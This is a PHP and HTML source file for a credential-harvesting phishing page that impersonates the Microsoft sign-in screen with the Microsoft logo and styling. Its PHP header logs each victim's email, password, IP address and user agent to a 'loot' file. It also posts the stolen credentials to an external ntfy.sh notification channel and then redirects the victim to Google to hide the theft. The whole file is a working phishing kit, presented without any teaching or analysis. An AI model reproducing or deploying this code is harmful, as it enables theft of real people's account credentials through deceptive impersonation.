<?php
// GARMR Microsoft Portal - Credential Harvester
$loot_file = '/root/loot/garmr/creds.txt';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];

    $log = "[$timestamp] MICROSOFT | Email: $email | Password: $password | IP: $ip | UA: $ua\n";
    file_put_contents($loot_file, $log, FILE_APPEND | LOCK_EX);

    $ntfy_msg = "🪟 MICROSOFT CREDS\nEmail: $email\nPass: $password\nIP: $ip";
    @file_get_contents("https://ntfy.sh/HALE-Pager-Alerts", false, stream_context_create([
        'http' => ['method' => 'POST', 'header' => 'Content-Type: text/plain', 'content' => $ntfy_msg]
    ]));

    header('Location: http://www.google.com');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
            background: #f2f2f2;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 44px;
            max-width: 440px;
            width: 100%;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
        }
        .logo {
            margin-bottom: 16px;
        }
        .logo svg {
            height: 24px;
        }
        h1 {
            color: #1b1b1b;
            font-size: 24px;
            margin-bottom: 24px;
            font-weight: 600;
        }
        .form-group {
            margin-bottom: 16px;
        }
        input {
            width: 100%;
            padding: 6px 10px;
            border: none;
            border-bottom: 1px solid #666;
            font-size: 15px;
            background: transparent;
            transition: border-color 0.2s;
        }
        input:focus {
            outline: none;
            border-bottom-color: #0067b8;
            border-bottom-width: 2px;
            padding-bottom: 5px;
        }
        input::placeholder {
            color: #666;
        }
        .options {
            margin: 16px 0;
        }
        .options a {
            color: #0067b8;
            text-decoration: none;
            font-size: 13px;
        }
        .options a:hover {
            text-decoration: underline;
            color: #005a9e;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #0067b8;
            color: white;
            border: none;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 24px;
        }
        button:hover {
            background: #005a9e;
        }
        .footer-links {
            margin-top: 16px;
            font-size: 13px;
        }
        .footer-links a {
            color: #0067b8;
            text-decoration: none;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        .footer-links span {
            color: #666;
            margin: 0 4px;
        }
        .sign-in-options {
            margin-top: 36px;
            padding-top: 16px;
            border-top: 1px solid #e1e1e1;
        }
        .sign-in-options p {
            font-size: 13px;
            color: #1b1b1b;
            margin-bottom: 12px;
        }
        .key-icon {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #0067b8;
            font-size: 13px;
            cursor: pointer;
        }
        .key-icon:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
                <!-- Microsoft Logo -->
                <rect width="10.5" height="10.5" fill="#f25022"/>
                <rect x="11.5" width="10.5" height="10.5" fill="#7fba00"/>
                <rect y="11.5" width="10.5" height="10.5" fill="#00a4ef"/>
                <rect x="11.5" y="11.5" width="10.5" height="10.5" fill="#ffb900"/>
                <!-- Microsoft Text -->
                <text x="28" y="17" font-family="Segoe UI, sans-serif" font-size="15" fill="#737373">Microsoft</text>
            </svg>
        </div>

        <h1>Sign in</h1>

        <form method="POST" action="capture.php">
            <div class="form-group">
                <input type="email" id="email" name="email" placeholder="Email, phone, or Skype" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>

            <div class="options">
                <a href="#">Can't access your account?</a>
            </div>

            <button type="submit">Sign in</button>
        </form>

        <div class="footer-links">
            <a href="#">Sign-in options</a>
        </div>

        <div class="sign-in-options">
            <p>No account? <a href="#">Create one!</a></p>
            <div class="key-icon">
                <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
                    <path d="M11 0a5 5 0 0 0-4.916 5.916L0 12v3a1 1 0 0 0 1 1h3v-2h2v-2h2l1.298-1.298A5 5 0 1 0 11 0zm1.498 5.002a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3z"/>
                </svg>
                Sign in with Windows Hello or a security key
            </div>
        </div>
    </div>
</body>
</html>
